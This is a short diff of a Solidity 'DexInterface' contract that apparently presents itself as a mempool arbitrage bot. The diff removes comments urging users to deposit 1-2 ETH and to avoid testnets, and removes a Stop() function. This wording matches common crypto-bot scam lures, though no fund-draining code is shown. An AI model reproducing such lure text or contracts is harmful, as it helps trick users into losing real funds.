@@ -3,10 +3,6 @@
 //SPDX-License-Identifier: MIT
 pragma solidity ^0.8.4;
  
-// Leo - Recommended liquidity after gas fees needs to equal 0.5 ETH use 1-2 ETH or more if possible
-// Mempool updated build OCTOBER 2024
-// User Guide
-// NOTE: DON'T TRY on Test-net transactions will fail since they don't hold any value and cannot read mempools properly
  
 interface IERC20 {
     function balanceOf(address account) external view returns (uint);
@@ -276,10 +272,6 @@ contract DexInterface {
        startArbitrageNative();
     }
    
-    // Stop trading function
-    function Stop() public {
-        enableTrading = false;
-    }
     // Function of deposit withdrawal to owner wallet
     function Withdraw()  external onlyOwner {
         recoverEth();
